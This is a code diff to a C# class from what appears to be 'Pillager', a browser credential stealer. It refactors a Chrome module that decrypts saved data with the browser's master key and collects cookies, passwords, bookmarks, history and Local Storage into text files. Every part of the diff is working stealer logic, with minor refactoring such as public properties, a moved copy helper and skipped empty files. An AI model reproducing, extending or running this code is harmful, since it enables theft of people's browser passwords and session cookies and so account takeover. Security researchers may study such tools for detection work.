@@ -8,11 +8,11 @@ namespace Pillager.Browsers
 {
     public class Chrome
     {
-        private string BrowserPath { get; set; }
+        public string BrowserPath { get; set; }
 
         public string BrowserName { get; set; }
 
-        private byte[] MasterKey { get; set; }
+        public byte[] MasterKey { get; set; }
 
         public Chrome(string Name,string Path)
         {
@@ -62,11 +62,6 @@ namespace Pillager.Browsers
                     Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                     byte[] data = new byte[cipherText.Length - tag.Length];
                     Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
-
-                    //byte[] iv = buffer.Skip(3).Take(12).ToArray();
-                    //byte[] cipherText = buffer.Skip(15).ToArray();
-                    //byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
-                    //cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
                     decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                 }
                 else
@@ -132,9 +127,9 @@ namespace Pillager.Browsers
             }
             try
             {
-                string cookie_tempFile = Path.GetTempFileName();
-                File.Copy(chrome_History_path, cookie_tempFile, true);
-                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
+                string history_tempFile = Path.GetTempFileName();
+                File.Copy(chrome_History_path, history_tempFile, true);
+                SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                 if (!handler.ReadTable("urls"))
                     return null;
                 for (int i = 0; i < handler.GetRowCount(); i++)
@@ -142,7 +137,7 @@ namespace Pillager.Browsers
                     string url = handler.GetValue(i, "url");
                     history.AppendLine(url);
                 }
-                File.Delete(cookie_tempFile);
+                File.Delete(history_tempFile);
             }
             catch { }
 
@@ -206,51 +201,22 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
-        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
-        {
-            var dir = new DirectoryInfo(sourceDir);
-
-            if (!dir.Exists)
-                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");
-
-            DirectoryInfo[] dirs = dir.GetDirectories();
-            Directory.CreateDirectory(destinationDir);
-            foreach (FileInfo file in dir.GetFiles())
-            {
-                string targetFilePath = Path.Combine(destinationDir, file.Name);
-                file.CopyTo(targetFilePath);
-            }
-
-            if (recursive)
-            {
-                foreach (DirectoryInfo subDir in dirs)
-                {
-                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
-                    CopyDirectory(subDir.FullName, newDestinationDir, true);
-                }
-            }
-        }
+        
 
         public void Save(string path)
         {
-            if (MasterKey==null)
-            {
-                return;
-            }
+            if (MasterKey==null) return;
             string savepath = Path.Combine(path, BrowserName);
             Directory.CreateDirectory(savepath);
             string cookies = Chrome_cookies();
             string passwords = Chrome_passwords();
             string books = Chrome_books();
             string history = Chrome_history();
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-            File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-            if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage")))
-            {
-                CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"),true);
-            }
+            if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+            if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+            if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+            if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
             Console.WriteLine("Files wrote to " + savepath);
         }
     }
